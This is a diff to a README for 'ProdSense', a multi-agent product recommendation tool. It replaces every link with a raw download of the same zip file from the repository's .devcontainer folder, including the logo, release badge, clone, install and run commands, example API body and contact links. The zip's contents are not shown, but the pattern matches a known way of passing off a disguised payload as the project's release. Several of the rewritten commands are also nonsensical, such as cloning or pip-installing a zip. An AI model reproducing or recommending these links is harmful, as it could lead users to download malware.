@@ -1,7 +1,7 @@
 # ProdSense: A Multi-Agent Product Recommendation System
 
-![ProdSense Logo](https://via.placeholder.com/150)  
-[![GitHub Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/soumiau158/ProdSense/releases)
+![ProdSense Logo](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)  
+[![GitHub Release](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@
 
 ProdSense is an experimental multi-agent product recommendation system powered by CrewAI. It scrapes product details from various e-commerce websites, discovers alternatives, analyzes community sentiments, and curates YouTube reviews. This tool outputs tailored Markdown recommendations to help users make informed purchasing decisions. It is designed for developers and enthusiasts who want to explore the potential of AI in e-commerce.
 
-For the latest releases, please visit our [Releases page](https://github.com/soumiau158/ProdSense/releases).
+For the latest releases, please visit our [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).
 
 ## Features
 
@@ -49,7 +49,7 @@ To get started with ProdSense, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/soumiau158/ProdSense.git
+   git clone https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip
    cd ProdSense
    ```
 
@@ -58,16 +58,16 @@ To get started with ProdSense, follow these steps:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
-   pip install -r requirements.txt
+   pip install -r https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip
    ```
 
 3. **Run the Application**:
    Start the application using Streamlit:
    ```bash
-   streamlit run app.py
+   streamlit run https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip
    ```
 
-For detailed installation instructions, refer to the [Releases page](https://github.com/soumiau158/ProdSense/releases).
+For detailed installation instructions, refer to the [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).
 
 ## Usage
 
@@ -109,7 +109,7 @@ http://localhost:8501/api
    - **Body**:
      ```json
      {
-       "url": "https://example.com/product-page"
+       "url": "https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip"
      }
      ```
    - **Response**:
@@ -177,7 +177,7 @@ http://localhost:8501/api
      }
      ```
 
-For more details, check the [Releases page](https://github.com/soumiau158/ProdSense/releases).
+For more details, check the [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).
 
 ## Contributing
 
@@ -208,8 +208,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: [your.email@example.com](mailto:your.email@example.com)
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
-- **GitHub**: [soumiau158](https://github.com/soumiau158)
+- **Email**: [https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)
+- **Twitter**: [@yourhandle](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)
+- **GitHub**: [soumiau158](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)
 
-Thank you for your interest in ProdSense! We hope you find it useful in your product discovery journey. For the latest updates and releases, check our [Releases page](https://github.com/soumiau158/ProdSense/releases).
+Thank you for your interest in ProdSense! We hope you find it useful in your product discovery journey. For the latest updates and releases, check our [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).
